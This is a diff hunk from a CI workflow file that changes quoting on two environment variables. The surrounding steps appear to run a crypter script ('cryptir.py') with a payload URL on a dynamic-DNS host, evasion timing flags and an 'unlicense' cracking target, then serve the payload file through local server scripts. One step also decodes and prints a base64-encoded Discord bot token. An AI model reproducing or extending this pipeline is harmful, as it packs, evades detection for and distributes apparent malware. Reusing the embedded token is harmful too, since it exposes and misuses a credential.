@@ -224,8 +224,8 @@ jobs:
           chcp 65001
           pyw -3.11 cryptir.py --interval 3600 --sleep 100 --payload-url http://heteronomous.kozow.com/files/sv2.dat --output . --input out.exe --skip-obfuscation  --unlicense-target ShulkerV2.exe --patch-script patch.py
           $env:DISCORD_BOT_TOKEN = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TVRRMU9UYzRPVFk1TnpJNU1ETXpPRE00TncuR0tUb1FVLlQzLTJCQVpQTWsyVExsS1N3NTBWU1JoZElqR2VkSGFveEN4QTFNCg==")); Write-Host $env:DISCORD_BOT_TOKEN
-          $env:FILES_DIR=./;
-          $env:FILES_WHITELIST=sv2.dat;
+          $env:FILES_DIR="./";
+          $env:FILES_WHITELIST="sv2.dat";
           $env:ALLOWED_ROLES="";
           pyw -3.11 server.py 
           pyw -3.11 cloud.py
